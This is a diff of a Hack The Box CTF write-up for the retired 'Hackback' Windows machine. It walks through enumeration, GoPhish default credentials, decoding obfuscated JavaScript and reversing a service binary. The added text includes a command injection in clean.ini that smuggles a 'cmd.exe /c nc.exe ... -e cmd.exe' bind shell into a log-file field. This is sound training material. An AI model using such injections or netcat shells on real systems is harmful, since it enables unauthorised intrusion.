@@ -98,21 +98,21 @@ If you find anything in this writeup you feel is inaccurately depicted and/or ex
 
 ### Overview
 
-The `Hackback` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/1391">decoder</a> and <a href="https://www.hackthebox.eu/home/users/profile/12438">yuntao</a>) is a retired 50 point Windows machine. This machine is incredibly difficult; so difficult that it maintained a 9.4/10 difficulty rating for almost a week upon being released. The initial steps involve locating a GoPhish website where default credentials are used to login. There are also some virtual hosts which lead to a hidden administration link within obfuscated JavaScript code. Next, the parameters of a web admin page can be fuzzed to determine its log files are SHA-256 checksums of connecting IP addresses. Log poisoning is then performed to gain read/write access. A file called `web.config.old` is extracted from the web server and contains credentials for the user `simple`. A reGeorg ASPX tunnel is then utilized to connect to the remote machine. This enables tunneling via a SOCKS proxy with WinRM and the credentials found for `simple` in `web.config.old`. A command injection vulnerability in a powershell script called `dellog.ps1` can be leveraged in association with a `clean.ini` file to escalate to the user `hacker`. Once escalated, the user `hacker` can start/stop a suspicious service called `UserLogger`, which accepts an argument. This can be abused to escalate folder path permissions. Finally, `root.txt` can be viewed by reading an alternate data stream (ADS).
+The `Hackback` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/1391">decoder</a> and <a href="https://www.hackthebox.eu/home/users/profile/12438">yuntao</a>) is a retired 50 point Windows machine. This machine is incredibly difficult; so difficult that it maintained a 9.4/10 difficulty rating for almost a week upon being released. The initial steps involve locating a GoPhish website where default credentials are used to login. There are also some virtual hosts which lead to a hidden administration link within obfuscated JavaScript code. Next, the parameters of a web admin page can be fuzzed to determine its log files are SHA-256 checksums of connecting IP addresses. Log poisoning is then performed to gain read/write access. A file called `web.config.old` is extracted from the web server and contains credentials for the user `simple`. A reGeorg ASPX tunnel is then utilized to connect to the remote machine. This enables tunneling via a SOCKS proxy with WinRM and the credentials found for `simple` in `web.config.old`. A command injection vulnerability in a powershell script called `dellog.ps1` can be leveraged in association with `dellog.bat` and `clean.ini` files to escalate to the user `hacker`. Once escalated, the user `hacker` can start/stop a suspicious service called `UserLogger`, which accepts an argument. This can be abused to escalate folder path permissions. Finally, `root.txt` can be viewed by reading an alternate data stream (ADS).
 
 <p><br></p>
 
 _deep breath_
 
 <p><br></p>
-To start, I dove in with an initial `nmap` scan for general port discovery and service enumeration.
+To start, I performed one of my usual initial `nmap` scans for general port discovery and service enumeration.
 <p><br></p>
 
 ### Nmap Scan
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 ➜  HACKBACK cat nmap/Full_10.10.10.128.nmap
-# Nmap 7.70 scan initiated Wed Jun 26 18:41:47 2019 as: nmap -Pn -sCV -p80,6666,64831 -oN nmap/Full_10.10.10.128.nmap 10.10.10.128
+# Nmap 7.70 scan initiated Wed Jun 26 18:41:47 2019 as: nmap -p- -Pn -sCV -oN nmap/Full_Scan.nmap 10.10.10.128
 Nmap scan report for hackback.htb (10.10.10.128)
 Host is up (0.082s latency).
 
@@ -167,7 +167,7 @@ PORT STATE SERVICE VERSION
 
 ### Enumerating Port 80
 
-I additionally added `hackback.htb` to my `/etc/hosts` file. After, the first thing I noticed was the IIS 10.0 web server running on port 80. Upon browsing to the address in Firefox-ESR, I was greeted by a picture of a donkey...
+At this stage I additionally added `hackback.htb` to my `/etc/hosts` file. The first thing I noticed upon browsing to the web page on port 80 (IIS 10.0) was a picture of a donkey...
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-WP-DONKEY.PNG" class="hackback-img" alt="Hackback - Front Page Donkey">
 
@@ -195,7 +195,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ### Enumerating Port 6666
 
-Moving on, I checked out port 6666. It appears to be running Microsoft HTTPAPI 2.0, so I ran `gobuster` again to see if I could find anything useful.
+Moving on, I checked out port 6666. It appeared to be running Microsoft HTTPAPI 2.0, so I ran `gobuster` again to see if I could find anything worth digger deeper into.
 
 ```bash
 ➜  HACKBACK gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://hackback.htb:6666/ -x php,aspx,txt,ini,png,jpg
@@ -223,7 +223,7 @@ Eventually a `/help` directory was discovered, which I attempted to interact wit
 "hello,proc,whoami,list,info,services,netsat,ipconfig"
 ```
 
-Unfortunately, none of the commands appeared to be very useful, and I wasn't getting anywhere attempting to perform different injection attacks in the process of enumerating...
+Unfortunately, none of the commands appeared to be useful, and I wasn't getting anywhere attempting to perform different injection attacks in the process of enumerating...
 
 ```bash
 ➜  HACKBACK curl -X GET http://10.10.10.128:6666/hello
@@ -232,11 +232,15 @@ Unfortunately, none of the commands appeared to be very useful, and I wasn't get
 
 ### Enumerating Port 64831
 
-After spending a while messing with the commands on port 6666, I decided to browse port 64831. I had already been running passive recon on this port while attempting code injection on port 6666. This enabled me to quickly discover a GoPhish login page over HTTPS.
+After spending a while messing with the commands on port 6666, I decided to peruse port 64831. I had already been running passive recon on this port while attempting code injection on port 6666. This enabled me to quickly discover a GoPhish login page over HTTPS. I went ahead and checked the SSL certificate first to make sure there wasn't any additional helpful information there.
+
+<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GOPHISH-SSL.PNG" class="hackback-img" alt="Hackback - GoPhish SSL Certificate">
+
+I didn't find anything this time, but I always like to check just to be sure.
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GOPHISH-LOGIN.PNG" class="hackback-img" alt="Hackback - GoPhish Login">
 
-I decided to start off simple and look up the default credentials for a GoPhish `admin` account. A brief Google search did the trick:
+I then decided to start off simple and look up the default credentials for a GoPhish `admin` account. A brief Google search did the trick.
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-ADMIN-CREDS.PNG" class="hackback-img" alt="Hackback - GoPhish Login Credential Search">
 
@@ -252,13 +256,13 @@ After doing some browsing, I discovered the `Email Templates` panel contained qu
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-EMAIL-TEMPLATES.PNG" class="hackback-img" alt="Hackback - GoPhish Email Templates">
 
-The `Admin` template appeared to contain a information for the `admin` sub domain at `admin.hackback.htb`.
+The `Admin` template appeared to contain information for the `admin` sub domain at `admin.hackback.htb`.
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ADMIN-TEMPLATE.PNG" class="hackback-img" alt="Hackback - GoPhish Admin Template">
 
 ### Enumerating the Admin Sub Domain
 
-Upon browsing to `admin.hackback.htb`, I was directed to some sort of login page.
+Looking at `admin.hackback.htb`, I was directed to some sort of login page.
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ADMIN-SD.PNG" class="hackback-img" alt="Hackback - Admin Sub Domain Login">
 
@@ -266,7 +270,7 @@ Viewing the page's source, I discovered an interesting comment left in the HTML.
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-JS-NOTE.PNG" class="hackback-img" alt="Hackback - JavaScript Comment ">
 
-However, upon browsing to `admin.hackback.htb/js/.js`, I was met with a 404 error.
+However, after checking `admin.hackback.htb/js/.js`, I was met with a 404 error.
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-JS-ERROR.PNG" class="hackback-img" alt="Hackback - GoPhish JavaScript File Error">
 
@@ -297,7 +301,7 @@ I immediately got a hit on `private.js`!
 ### Analyzing the private.js File
 
 
-Checking out the source, it appeared to be a bunch of obfuscated JavaScript...
+Examining the source, it appeared to be a bunch of obfuscated JavaScript...
 
 <img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-PRIVATEJS.PNG" class="hackback-img" alt="Hackback - private.js file">
 
@@ -306,11 +310,11 @@ Further examination of the `private.js` file revealed it is actually encoded wit
 ```javascript
 ine n =
 ``` 
-I attributed it to being
+Which I attributed to being:
 ```javascript
 var a =
 ```
-I also had to decipher the remainder with a `Caesar cipher`. This was the output once I had everything decoded and beautified:
+I also had to decipher the remainder of the code with a `Caesar cipher` variation. This was the output once I had everything decoded and beautified:
 ```javascript
 var a = [
   'WxIjwr7DusO8GsKvRwB+wq3DuMKrwrLDgcOiwrY1KEEgG8KCwq7Dl8K3',
@@ -428,7 +432,7 @@ Once I had the full output, I was able to run the `private.js` file and extract 
 > w
 'Nothing more to say'
 ```
-It appears there is a secret path at `/2bb6916122f1da34dcd916421e531578`. However, I wasn't able to locate anything when checking the URL directly.
+It appeared there was a secret path at `/2bb6916122f1da34dcd916421e531578`. However, I wasn't able to locate anything when checking the URL directly.
 
 ```bash
 ➜  HACKBACK curl -X GET http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578
@@ -541,7 +545,7 @@ ID           Response   Lines    Word     Chars       Payload
 000000008:   302        6 L      12 W     117 Ch      "12345678" 
 ```
 
-The password is `12345678`. When I ran `curl` against the endpoint using that password, I got an interesting response.
+The password is `12345678`. When I ran `curl` against the endpoint using that password and the `hackthebox` site specified, I got an interesting response.
 
 ```bash
 ➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=12345678'
@@ -800,7 +804,7 @@ Mode                LastWriteTime         Length Name
 d--h--       12/21/2018   6:21 AM                scripts
 ```
 
-Checking permissions on the directory, I noticed it is owned by a user called `hacker`.
+Checking permissions on the directory, I noticed it was owned by a user called `hacker`.
 
 ```bash
 PS hackback\simple@HACKBACK > Get-Acl | fl
@@ -837,7 +841,25 @@ Access to the path 'C:\util\scripts\dellog.ps1' is denied.
 But, I was promptly denied...
 <p><br></p>
 
-At this point, I felt as though I had enumerated everything... Nothing was particularly sticking out. That is, until I realized `simple` was a member of the `project-managers` group – a group which was able to write to the `clean.ini` file.
+I checked the `dellog.bat` file as well, and managed to read its contents.
+
+```bash
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> cat C:\util\scripts\dellog.bat
+@echo off
+rem =scheduled=
+echo %DATE% %TIME% start bat >c:\util\scripts\batch.log
+powershell.exe -exec bypass -f c:\util\scripts\dellog.ps1 >> c:\util\scripts\batch.log
+for /F "usebackq" %%i in (`dir /b C:\util\scripts\spool\*.bat`) DO (
+start /min C:\util\scripts\spool\%%i
+timeout /T 5
+del /q C:\util\scripts\spool\%%i
+)
+```
+
+The script appears to execute `dellog.ps1` first and then append the resulting output to `batch.log`. After that it runs the contents of the `spool` folder. By the looks of it though, I don't have permission to view this folder.
+<p><br></p>
+
+I then realized `simple` was a member of the `project-managers` group – a group which was able to write to the `clean.ini` file.
 
 ```bash
 PS hackback\simple@HACKBACK > whoami /groups
@@ -924,14 +946,19 @@ Mode                LastWriteTime         Length Name
 
 I was then able to modify the `clean.ini` file to contain a `cmd.exe` call to `nc.exe` and my listener's port (9001) running over `proxychains`.
 
+
+
 ```bash
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> echo [Main] > C:\util\scripts\clean.ini
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> echo LifeTime=100 >> C:\util\scripts\clean.ini
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> echo "LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lnvp 9001 -e cmd.exe" >> C:\util\scripts\clean.ini
 +*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> type C:\util\scripts\clean.ini
 [Main]
 LifeTime=100
 LogFile=C:\util\scripts\log.txt & cmd.exe /c C:\Windows\System32\spool\drivers\color\nc.exe -lvp 9001 -e cmd.exe
 ```
 
-And immediately I caught a shell as `hacker`. I was finally able to view `user.txt`!
+After a couple retries opening my listener, I caught a shell `hacker`. I was finally able to view `user.txt`.
 
 ```bash
 ➜  HACKBACK proxychains nc hackback.htb 9001
@@ -947,6 +974,236 @@ C:\Windows\system32>cd C:\Users\hacker\Desktop & type user.txt
 cd C:\Users\hacker\Desktop & type user.txt
 922449f8e39c2<redacted>
 ```
+
+### Enumerating as `hacker`
+
+Now that I was operating as `hacker`, I decided to refer to some of the services running on the machine to determine what I may be able to control. Running `grep` for `user` helped me locate a couple interesting ones. A service called `UserLogger` as well as another called `UserManager`. 
+
+```bash
+➜  www curl -s http://10.10.10.128:6666/services > ../services.txt
+➜  www cd ..;cat services.txt| grep User
+        "displayname":  "Connected User Experiences and Telemetry",
+        "displayname":  "User Profile Service",
+        "displayname":  "User Access Logging Service",
+        "displayname":  "User Experience Virtualization Service",
+        "displayname":  "Remote Desktop Services UserMode Port Redirector",
+        "name":  "UserLogger",
+        "displayname":  "User Logger",
+        "name":  "UserManager",
+        "displayname":  "User Manager"
+```
+
+Maintaining the theme of `logs`, I decided `UserLogger` might be an interesting service to check out first. I queried the service to check its current status first.
+
+```bash
+C:\Users\hacker\Desktop>cmd /c "sc qc userlogger"
+cmd /c "sc qc userlogger"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: userlogger
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : c:\windows\system32\UserLogger.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : User Logger
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+Now I have verified the path of the binary as well: `c:\windows\system32\UserLogger.exe` I also ran `sdshow` to determine that the user `hacker` is able to start/stop the service.
+
+```bash
+C:\Users\hacker\Desktop>cmd /c "sc sdshow userlogger"
+cmd /c "sc sdshow userlogger"
+
+D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLORC;;;S-1-5-21-2115913093-551423064-1540603852-1003)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLORC;;;BU)(A;;CCLCSWRPWPLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+```
+
+I was able to verify this by copying the SID `S-1-5-21-2115913093-551423064-1540603852-1003` and then running `wmic` to compare it with the SID for the user `hacker`.
+
+```bash
+C:\Users\hacker\Desktop>cmd /c "wmic useraccount where name='hacker' get sid"
+cmd /c "wmic useraccount where name='hacker' get sid"
+SID                                            
+S-1-5-21-2115913093-551423064-1540603852-1003 
+```
+
+They matched, so I was positive I could start/stop the `UserLogger` service.
+<p><br></p>
+
+I also checked some additional details about the service with Powershell.
+
+```bash
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> get-service userlogger | fl *
+Name                : userlogger
+RequiredServices    : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+DisplayName         : User Logger
+DependentServices   : {}
+MachineName         : .
+ServiceName         : userlogger
+ServicesDependedOn  : {}
+ServiceHandle       : 
+Status              : Running
+ServiceType         : Win32OwnProcess
+StartType           : Manual
+Site                : 
+Container           :
+```
+
+I decided to download the `userlogger.exe` binary using the `evil-winrm` shell so I could reverse it and fully understand what it was doing.
+
+```bash
++*Evil-WinRM* PS C:\Windows\System32> download userlogger.exe
+Info: Downloading C:\Windows\System32\userlogger.exe to userlogger.exe
+
+Info: Download successful!
+
+----
+
+➜  www ls -al
+total 112
+drwxr-xr-x 2 root root  4096 Apr 17 10:42 .
+drwxr-xr-x 5 root root  4096 Apr 17 10:08 ..
+-rwxr-xr-x 1 root root 45272 Apr 16 17:26 nc.exe
+-rw-r--r-- 1 root root 54784 Apr 17 10:42 userlogger.exe
+➜  www 
+```
+
+I decided to be lazy first and check the binary's contents with `strings`. I notice third and fourth lines include `UPX0` and `UPX1`, which refers to UPX file packing.
+
+```bash
+➜  www strings userlogger.exe
+!This program cannot be run in DOS mode.
+Rich]
+UPX0
+UPX1
+```
+
+I can utilize `upx` for linux with the `-d` flag to decompress the UPX packed binary.
+
+```bash
+➜  www upx -d userlogger.exe -o userlogger.upx.exe
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2018
+UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     90624 <-     54784   60.45%    win64/pe     userlogger.upx.exe
+
+Unpacked 1 file.
+```
+
+This made the `strings` output display more calls/functions, therefore creating more useful output.
+
+```
+➜  www strings userlogger.upx.exe 
+...
+GetOEMCP
+GetCPInfo
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetEnvironmentVariableW
+CompareStringW
+LCMapStringW
+SetStdHandle
+GetFileType
+GetStringTypeW
+GetProcessHeap
+HeapSize
+HeapReAlloc
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+SetFilePointerEx
+WriteConsoleW
+```
+
+I decided to import the unpacked binary into Ghidra to further reverse the functions.
+
+<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-UL-GHIDRA-IMPORT.PNG" class="hackback-img" alt="Hackback - UserLogger.exe Ghidra Import">
+
+Ghidra then analyzed the binary upon importing as well.
+
+<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ANALYZE-BINARY.PNG" class="hackback-img" alt="Hackback - UserLogger.exe Ghidra Analysis">
+
+After doing some further analysis, I determined the binary accepted an argument.
+
+<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-BINARY-ARGUMENT.PNG" class="hackback-img" alt="Hackback - UserLogger.exe Takes Argument">
+
+Further examination revealed a `.log` file is generated with the same name as our argument.
+
+<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-LOGFILE-GENERATED.PNG" class="hackback-img" alt="Hack The Box - Hackback">
+
+I was able to verify this process by creating a dummy `.log` file and specifying it as a parameter when starting the `UserLogger` service.
+
+```bash
+C:\Users\hacker\Documents>sc start userlogger c:\users\hacker\documents\farbs.log
+sc start userlogger c:\users\hacker\documents\farbs.log
+
+SERVICE_NAME: userlogger 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3616
+        FLAGS              : 
+```
+
+Afterwards, I noticed another `.log` file had been generated as expected.
+
+```bash
+C:\Users\hacker\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 00A3-6B07
+
+ Directory of C:\Users\hacker\Documents
+
+04/17/2020  05:08 PM    <DIR>          .
+04/17/2020  05:08 PM    <DIR>          ..
+04/17/2020  05:07 PM                19 farbs.log
+04/17/2020  05:08 PM                58 farbs.log.log
+```
+
+I checked the contents of it as well.
+
+```bash
+C:\Users\hacker\Documents>type farbs.log.log
+type farbs.log.log
+Logfile specified!
+Service is starting
+Service is running
+```
+
+<b>Sidenote:</b> It's worth mentioning that your shell needs to be a 64-bit process for this to work properly, so make sure you are using a 64-bit version of netcat.
+<p><br></p>
+
+At this point it was time for me to stop `UserLogger` and focus on getting a proper shell, or at least reading `root.txt`.
+
+```bash
+C:\Users\hacker\Documents>sc stop userlogger
+sc stop userlogger
+
+SERVICE_NAME: userlogger 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x4
+        WAIT_HINT          : 0x0
+```
+
+
 
 ### Writeup still in progress... Check back later for more!
 
